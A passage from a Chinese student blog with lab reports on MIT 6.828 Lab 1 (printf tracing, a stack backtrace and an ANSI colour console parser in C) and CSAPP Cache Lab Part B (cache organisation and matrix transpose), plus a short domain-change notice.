<li>fmt指向了格式化字符串”x %d, y %x, z %d\n”<br>ap指向了局部变量并且初始值为1<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">vcprintf(<span class="number">0xf0102449</span>, <span class="number">0xf0110e14</span>); <span class="number">0xf0102449</span> -&gt; <span class="string">"x %d, y %x, z %d\n"</span> <span class="number">0xf0110e14</span> -&gt; <span class="number">1</span></div><div class="line">cons_putc(<span class="number">120</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>); Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e14</span> -&gt; <span class="number">1</span> After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e18</span> -&gt; <span class="number">3</span></div><div class="line">cons_putc(<span class="number">49</span>);</div><div class="line">cons_putc(<span class="number">44</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">cons_putc(<span class="number">121</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>); Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e18</span> -&gt; <span class="number">3</span> After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e1c</span> -&gt; <span class="number">4</span></div><div class="line">cons_putc(<span class="number">51</span>);</div><div class="line">cons_putc(<span class="number">44</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">cons_putc(<span class="number">122</span>);</div><div class="line">cons_put(<span class="number">32</span>);</div><div class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>); Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e1c</span> -&gt; <span class="number">4</span> After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e20</span> -&gt; <span class="number">536870922</span></div><div class="line">cons_put(<span class="number">52</span>);</div><div class="line">cons_put(<span class="number">10</span>);</div></pre></td></tr></table></figure>
注意这里va_arg是宏而不是函数，不能通过加断点的方式跟踪。我采用的方法是在调用va_arg的地方添加断点并跟踪。<br>在GNUmakefile中的C_FLAGS -O1会重排C代码，导致了追踪va_arg变得困难。所以，仅在此处将-O1变成-O0，尽管这会导致在backtrace时kernel panic。</li>
<li>57616 = 0xe110。此外，根据x86的小端序，&amp;i指向了byte序列0x72、0x6c、0x64、0x00。这等同于字符串”rld”。所以，最终的输出为”He110 World”。<br>需要将i改为0x726c6400。不需要修改57616。</li>
<li>这是由于程序从格式化字符串中推断出了应当有3个参数，所以程序会从cprintf的栈中多读取一个参数。但我们知道，实际上只有2个参数。所以最后一个参数是未指定的。</li>
<li>vcprintf(…, const char * fmt)。</li>
</ol>
<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>练习9：<br>f0100034:    bc 00 00 11 f0           mov    $0xf0110000,%esp<br>这一条指令初始化了引导栈，它位于0xf0110000处。内核仅通过设置esp寄存器的值为栈预留空间。栈指针指向高地址，并且栈自高地址向低地址延伸。</p>
<p>练习10：<br>本题考察了x86架构下的栈帧与函数调用。<br>函数调用时先将返回地址压栈，然后跳转至目标函数的起始地址；在目标函数内先将ebp寄存器的值（栈底）压栈保存，然后再将栈顶指针设置为新的栈底；<br>在函数中调用函数需要使用栈来传递参数，即将函数的参数以此压入栈中；<br>test_backtrace函数的汇编中使用了ebx寄存器，该寄存器为被调用者保存的寄存器，在使用的时候也要先压栈保存，再函数返回时恢复；<br>函数返回的时候通过先操作esp释放栈资源，然后恢复相应的被调用者保存的寄存器的值，最后调用汇编指令leave、ret返回；<br>leave指令先将esp的值置为ebp，然后再从栈中取出被保存的ebp的旧值；ret从栈中取出返回地址并跳转。</p>
<p>练习10-12：<br>mon_backtrace的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">mon_backtrace</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint32_t</span> ebp, eip, args[<span class="number">5</span>];</div><div class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">info</span>;</span></div><div class="line"></div><div class="line">	cprintf(<span class="string">"Stack backtrace:\n"</span>);</div><div class="line">	<span class="keyword">for</span> (ebp = read_ebp() ; ebp != <span class="number">0</span> ; ebp = *((<span class="keyword">uint32_t</span> *)ebp)) &#123;</div><div class="line">		eip = *((<span class="keyword">uint32_t</span> *)ebp + <span class="number">1</span>);</div><div class="line"></div><div class="line">		debuginfo_eip(eip, &amp;info);</div><div class="line"></div><div class="line">		args[<span class="number">0</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">2</span>);</div><div class="line">		args[<span class="number">1</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">3</span>);</div><div class="line">		args[<span class="number">2</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">4</span>);</div><div class="line">		args[<span class="number">3</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">5</span>);</div><div class="line">		args[<span class="number">4</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">6</span>);</div><div class="line">		cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>, ebp, eip, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>], args[<span class="number">3</span>], args[<span class="number">4</span>]);</div><div class="line"> 		cprintf(<span class="string">"      %s:%d: %.*s+%d\n"</span>, info.eip_file, info.eip_line, info.eip_fn_namelen, info.eip_fn_name, eip - info.eip_fn_addr);</div><div class="line"> 	&#125;</div><div class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"> &#125;</div><div class="line"> </div></pre></td></tr></table></figure><br>查阅STABS文档可以知道表示行号的成员是n_desc，所以debuginfo_eip的缺失的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</div><div class="line"><span class="keyword">if</span> (lline &lt;= rline) &#123;</div><div class="line">	info-&gt;eip_line = stabs[lline].n_desc;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>修改后的commands结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Command</span> <span class="title">commands</span>[] = &#123;</span></div><div class="line">&#123; <span class="string">"help"</span>, <span class="string">"Display this list of commands"</span>, mon_help &#125;,</div><div class="line">&#123; <span class="string">"kerninfo"</span>, <span class="string">"Display information about the kernel"</span>, mon_kerninfo &#125;,</div><div class="line">&#123; <span class="string">"backtrace"</span>, <span class="string">"Display information about the stack frames"</span>, mon_backtrace &#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h4 id="提高-允许控制台输出不同颜色的文本"><a href="#提高-允许控制台输出不同颜色的文本" class="headerlink" title="提高 - 允许控制台输出不同颜色的文本"></a>提高 - 允许控制台输出不同颜色的文本</h4><p>要求能增强控制台的功能使得控制台可以输出不同颜色的字体。这里使用了传统的实现，解析嵌入在文本字符串中的ANSI转义序列来实现题目的要求。</p>
<p>在王爽的《汇编语言》中，已经接触过了字符的“属性字节”，一个字符的自低到高的第2个字节可以作为属性字节，用来指示字符的属性如闪烁、高亮、前景色、背景色等。<br>有关于ANSI转义序列的相关知识可以参考<a href="http://rrbrandt.dee.ufcg.edu.br/en/docs/ansi/" target="_blank" rel="external">这里</a>。</p>
<p>出于简化考虑，只部分实现ANSI转义序列中的<code>ESC[Ps;...;Psm</code>。</p>
<p>实现的思路是实现<code>&lt;kern/printf.c&gt;</code>中的punch函数的替代版本attribute_punch，来实现对于ANSI转义序列的解析，并且相应地设置字符的属性字节。</p>
<p>解析所需要的状态机具有三个状态：A_NORM代表正常的输出字符的状态、A_TRANS代表接收到[ESC]开始，从正常状态到解析转义序列的过渡状态、A_ESCAPE代表解析转义序列的状态。它们之间的状态转换图如图所示：</p>
<img src="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/ansi_stm.png" alt="ansi_stm.png" title="">
<p>value用来存储每一个解析到的值，temp代表了解析过程中临时的属性字节，attribute代表了当前打印字符时附加的属性字节。</p>
<p>具体的实现代码在<kern printf.c="">中：</kern></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// state for ANSI escape sequence interpretation</span></div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">	A_NORM = <span class="number">0</span>,</div><div class="line">	A_TRANS,</div><div class="line">	A_ESCAPE</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// colormap - number (x - 30/40)[0, 7] -&gt; attribute byte</span></div><div class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> colormap[<span class="number">8</span>] =</div><div class="line">&#123;</div><div class="line">	<span class="number">0x0000</span>, <span class="number">0x4400</span>, <span class="number">0x2200</span>, <span class="number">0x6600</span>,</div><div class="line">	<span class="number">0x1100</span>, <span class="number">0x5500</span>, <span class="number">0x3300</span>, <span class="number">0x7700</span>,</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">attribute_punch</span><span class="params">(<span class="keyword">int</span> ch, <span class="keyword">int</span> *cnt)</span> &#123;</div><div class="line">	<span class="keyword">static</span> <span class="keyword">int</span> value = <span class="number">0</span>; <span class="comment">// value</span></div><div class="line">	<span class="keyword">static</span> <span class="keyword">int</span> state = A_NORM; <span class="comment">// current state</span></div><div class="line">	<span class="keyword">static</span> <span class="keyword">int</span> temp = <span class="number">0x0000</span>, attribute = <span class="number">0x0000</span>; <span class="comment">// temp attribute, current attribute</span></div><div class="line"></div><div class="line">	<span class="keyword">switch</span>(state) &#123; <span class="comment">// state machine</span></div><div class="line">		<span class="keyword">case</span> A_NORM:</div><div class="line">			<span class="keyword">if</span> (ch == <span class="number">0x1B</span>) &#123; <span class="comment">// [ESC]</span></div><div class="line">				state = A_TRANS; <span class="comment">// transfer from A_NORM to A_TRANS</span></div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				cputchar((attribute &amp; <span class="number">0xFF00</span>) | ch); <span class="comment">// put character with attribute</span></div><div class="line">				*cnt++;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> A_TRANS:</div><div class="line">			<span class="keyword">if</span> (ch == <span class="string">'['</span>) &#123; <span class="comment">// [</span></div><div class="line">				state = A_ESCAPE; <span class="comment">// transfer from A_TRANS to A_ESCAPE</span></div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				state = A_NORM; <span class="comment">// transfer from A_TRANS to A_NORM</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> A_ESCAPE:</div><div class="line">			<span class="keyword">if</span> (ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>) &#123; <span class="comment">// digit - update value</span></div><div class="line">				value = value * <span class="number">10</span> + ch - <span class="string">'0'</span>;</div><div class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">';'</span> || ch == <span class="string">'m'</span>) &#123; <span class="comment">// ; or m set temp and clear value</span></div><div class="line">				<span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</div><div class="line">					temp  = colormap[<span class="number">0</span>];</div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value == <span class="number">5</span>) &#123;</div><div class="line">					temp |= <span class="number">0x8000</span>;</div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt;= <span class="number">30</span> &amp;&amp; value &lt;= <span class="number">38</span>) &#123;</div><div class="line">					temp |= colormap[value - <span class="number">30</span>] &amp; <span class="number">0x0700</span>; <span class="comment">// look up in color map</span></div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt;= <span class="number">40</span> &amp;&amp; value &lt;= <span class="number">48</span>) &#123;</div><div class="line">					temp |= colormap[value - <span class="number">40</span>] &amp; <span class="number">0x7000</span>; <span class="comment">// avoid complex cases</span></div><div class="line">				&#125;</div><div class="line">				value = <span class="number">0</span>;</div><div class="line">				<span class="keyword">if</span> (ch == <span class="string">'m'</span>) &#123; <span class="comment">// m needed extra work - update attribute</span></div><div class="line">					attribute = temp;</div><div class="line">					temp = <span class="number">0x0000</span>;</div><div class="line">					state = A_NORM; <span class="comment">// transfer from A_ESCAPE to A_NORM</span></div><div class="line">				&#125;</div><div class="line">			&#125; <span class="keyword">else</span> &#123; <span class="comment">// non_digit nor m</span></div><div class="line">				state = A_NORM; <span class="comment">// transfer from A_ESCAPE to A_NORM</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">vcprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list ap)</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">// vprintfmt((void*)putch, &amp;cnt, fmt, ap);</span></div><div class="line">	<span class="comment">// use attribute_punch rather than punch</span></div><div class="line">	vprintfmt((<span class="keyword">void</span> *)attribute_punch, &amp;cnt, fmt, ap);</div><div class="line">	<span class="keyword">return</span> cnt;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后我们在monitor.c中添加相关cprintf代码，并重新编译测试。最终如图所示：</p>
<img src="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/lab1_final.png" alt="lab1_final.png" title="">
<p>有关于实验指导中提到的打开vga硬件的graphics mode使得控制台绘制文本到图形帧缓冲区的实现，由于时间和难度原因，这里暂时跳过。</p>
<h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>第一个实验总体来说更偏重于概念的理解、工具的使用而不是实际的代码。</p>
<p>尽管如此，大量的概念也浪费了我很多时间去理解。MIT的6.828同清华的ucore操作系统实验相比提供了相当多的reference（ucore的阅读材料几乎都是现成的），这也对文档阅读和信息检索能力有了更高的要求。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/11/27/域名变更说明/">
                            域名变更说明
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-11-27T01:08:59+08:00">
	
		    11月 27, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/通知/">通知</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><ol>
<li>2016年1月3日，域名duskdragon.com随阿里云学生主机一起购入，预计于2017年1月3日过期</li>
<li>2016年2月1日，域名duskdragon.com备案完成</li>
<li>2016年11月6日，域名duskdragon.com续费1年，预计于2018年1月3日过期</li>
<li>2017年11月20日，新域名codedragon.tech购入，预计于2022年11月21日过期</li>
</ol>
<h2 id="域名变更说明"><a href="#域名变更说明" class="headerlink" title="域名变更说明"></a>域名变更说明</h2><p>从即日起至2018年1月3日，旧域名duskdragon.com和新域名codedragon.tech将同时有效，可通过这两个域名中的任意一个的二级域名blog访问本博客。</p>
<p>从2018年1月4日起，旧域名duskdragon.com将完全废弃，仅可通过codedragon.tech的二级域名blog访问本博客。</p>
<p>本次域名变更主要为了使域名更加贴近码龙的设定，并且在相当长的一段时间内都将会维持稳定；次要的考量在于.com域名的相对高价格。</p>
<p>由于codedragon.com已被注册，所以退而求其次地选择了codedragon.tech作为新域名。</p>
<h2 id="博客更新说明"><a href="#博客更新说明" class="headerlink" title="博客更新说明"></a>博客更新说明</h2><p>本次域名更新的同时也对博客进行了更新</p>
<ol>
<li>更换了新的头像 - Character(c) 我/Art By 漫步</li>
<li>博客描述性文字的修改</li>
<li>如果不额外说明，本博客的所有文章默认以CC BY-NC-SA 4.0即署名-非商业性使用-相同方式共享4.0国际发布。有关该协议的概要可以参考<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="external">这里</a></li>
<li>修复了失效的友情链接并添加了Suncio的博客为友情链接</li>
</ol>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/11/27/域名变更说明/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/">
                            深入理解计算机系统CacheLab-PartB实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2017-09-25T14:46:48+08:00">
	
		    9月 25, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>Cache Lab的Part B是我卡了比较久的实验，在7月份做完Part A之后我卡在了Part B的第二个矩阵优化，之后进度一直缓慢。直到几天之前团队分享，我才把这个实验重新捡了回来，最终将第二个矩阵转置优化到了1500+的miss数（尽管仍然没有达到满分），后参考了网上的思路完成了Part B，总结如下。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Cache Lab - Understanding Cache Memories主要是有关缓存的实验，对应于书本的第6章：存储器层次结构。主要阐明了缓存对于C语言程序的性能影响。</p>
<p>本实验的第二部分要求优化一个简单的矩阵变换函数，使其具有尽可能晓得缓存不命中数。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/archlab32-handout.tar" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="实验要求-Part-B"><a href="#实验要求-Part-B" class="headerlink" title="实验要求 - Part B"></a>实验要求 - Part B</h2><p>在Part B中你需要在trans.c中写一个矩阵转置函数，该函数要能有尽可能少的缓存不命中(miss)数。</p>
<p>令A代表一个矩阵，A(i, j)代表矩阵A的第i行第j列的元素。<br>那么，令B为矩阵A的转置，则对于A中的任意一个元素，满足A(i, j) = B(j, i)。</p>
<p>一个朴素的矩阵转置函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j, tmp;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</div><div class="line">            tmp = A[i][j];</div><div class="line">            B[j][i] = tmp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><br>该函数是正确的，但却并不是高效的，因为其访问模式导致了相当多的缓存不命中。</p>
<p>你的任务是完成一个相似的函数，并对于不同大小的矩阵块（32×32，64×64，61×67），最小化该函数的缓存不命中数。</p>
<p>对于Part B有以下的要求和限制：</p>
<ol>
<li>你所写的程序在编译时不能有任何的警告</li>
<li>在每一个你所写的转置函数中，你最多只能定义12个int型的局部变量</li>
<li>你不能使用long型的变量或是使用任何的技巧来使得在一个变量中存入多余一个的值</li>
<li>你的转置函数不能使用递归</li>
<li>如果你使用辅助函数，那么在同一时刻，你的调用栈上也不能出现超过12个局部变量</li>
<li>你的转置函数不能修改矩阵A，但是，你能任意的修改矩阵B</li>
<li>你不能定义任何的数组或是任何使用malloc的变量</li>
</ol>
<h2 id="实验过程-Part-B"><a href="#实验过程-Part-B" class="headerlink" title="实验过程 - Part B"></a>实验过程 - Part B</h2><h3 id="缓存简介"><a href="#缓存简介" class="headerlink" title="缓存简介"></a>缓存简介</h3><h4 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h4><p>局部性分为时间局部性和空间局部性——在一个具有良好的时间局部性的程序中，被引用过一次的内存位置可能在不远的将来再被多次引用。在一个具有良好的空间局部性的程序中，如果一个内存位置被引用了，那么程序很可能在不远的将来引用附近的一个内存位置。</p>
<p>一般来说，有良好局部性的程序比局部性差的程序运行的更快。现代计算机系统的各个层次，设计都利用了局部性。</p>
<p>在硬件层，通过高速缓存存储器来保存最近被引用的代码和数据，提高对主存的访问速度。<br>在操作系统层面，将虚拟内存作为主存和磁盘间高速缓存。<br>在网络中，主机可以作为代理缓存经常被访问的网页，浏览器也可以缓存最近访问过的页面。</p>
<h4 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h4><p>我们可以依次地组织不同的存储器，形成一个典型的存储器层次结构。如下图所示。</p>
<img src="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/memory-arch" alt="memory-arch" title="">
<p>在该结构中，自高层向底层走，存储设备变得更慢、更便宜和更大。每一层的存储器都作为下一级存储器的缓存。</p>
<h4 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h4><p>早期的计算机系统的存储器结构只有3层：CPU寄存器、DRAM主存储器和磁盘存储。随着CPU和主存之间不断加大的差距，系统设计者被迫在寄存器文件和主存之间加入了一个小的SRAM高速缓存处理器，称为L1高速缓存（一级缓存），L1高速缓存的访问速度几乎和寄存器一样快，典型地是约4个时钟周期。</p>
<p>随着CPU和主存之间的性能差距进一步增大，系统设计者在L1缓存和主存之间又加入了一个更大的高速缓存，称为L2高速缓存，可以在约10个时钟周期内被访问到。</p>
<p>有些现代系统还包括有一个更大的高速缓存，称为L3高速缓存，它位于L2高速缓存和主存之间，可以在大约50个时钟周期内被访问到。</p>
<h5 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h5><p>假定一个计算机系统，其每个存储器地址为m位，那么形成了M = 2 ^ m个不同的地址。</p>
<p>这样一个机器的高速缓存被组织成一个有S = 2 ^ s个高速缓存组（Cache Set）的数组，每个组包含E个高速缓存行（Cache Line）。每个行是由一个B = 2 ^ b字节的数据块（Block）组成的，一个有效位（valid bit）指明这个行是否包含有意义的信息。t = m - (b + s)个标记位（tag bit），它们唯一地标识存储在这个高速缓存行中的块。</p>
<p>一个通用的高速缓存组织结构可以用元组(S, E, B, m)来描述。<br>高速缓存的大小C指的是所有块（不包括标记位和有效位）的大小的和，C = S × E × B。</p>
<p>一个m位的地址L被组织为3个部分，分别是高t位的标记位，中间s位的组索引以及低b位的块偏移。</p>
<p>L中的s个组索引是一个到S个组的数组的索引，从0开始。其指示了该地址所指示的字应当存储到哪个组中。<br>L中的t个标记位指明了该组中的哪一行包含这个字。当且仅当有效位为1且行的标记位与地址的标记位相同时，组中的行才包含了这个字。<br>块偏移b指明了在B个字节的数据块中的字偏移。</p>
<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p>根据每个组的高速缓存行数E，高速缓存被分为不同的类：</p>
<ul>
<li>直接映射高速缓存。直接映射高速缓存中每个组只有一行（E = 1）。</li>
<li>组相连高速缓存。组相连高速缓存放宽了直接映射高速缓存中每个组只有一行的限制（1 &lt; E &lt; C/B）。</li>
<li>全相连高速缓存。全相连高速缓存是由一个包含了所有高速缓存行的组（E = C/B）组成的。</li>
</ul>
<p>组相连高速缓存引入了不命中时行替换策略的问题。比较常见的策略有最不常使用（LFU）和最近最少使用（LRU）。</p>
<p>由于构造又大又快的相连高速缓存很困难，全相连高速缓存通常只适合做小的高速缓存，如TLB（翻译备用缓冲器）。</p>
<h5 id="高速缓存写"><a href="#高速缓存写" class="headerlink" title="高速缓存写"></a>高速缓存写</h5><p>高速缓存写分为直写和写回。</p>
<ul>
<li>直写，当缓存更新后立刻将相应的高速缓存块写回到下一层存储器中。直写的缺点在于每次写都会引起总线流量。</li>
<li>写回，尽可能地推迟更新，只有当替换算法需要驱逐更新过的块时，才执行写入操作。写回极大地降低了总线流量。但是高速缓存必须对于每一个高速缓存行维护一个额外的修改位（dirty bit）来表明这个高速缓存块是否会修改过。</li>
</ul>
<h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p>
<p>在该实验中，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p>
<ol>
<li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li>
<li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li>
</ol>
<p>为了解决第一个问题，我们需要仔细地考虑对于矩阵元素访问的顺序。至于第二个问题，我们采用矩阵的分块技术来降低不命中数。</p>
<blockquote>
<p>矩阵分块的目的在于将大的、不能完全加载进入缓存的大矩阵分块成小的、可以完全加载进入缓存的小矩阵块来处理。小矩阵块具有良好的局部性，性能显著增加。<br>但同时也要注意，分块使得程序的可阅读性大大降低，因此一般只在常用的库函数中采用分块优化。</p>
</blockquote>
<h4 id="第一部分-32-×-32矩阵优化"><a href="#第一部分-32-×-32矩阵优化" class="headerlink" title="第一部分 32 × 32矩阵优化"></a>第一部分 32 × 32矩阵优化</h4><p>第一部分满分的要求是300个misses以内，misses超过600则0分。</p>
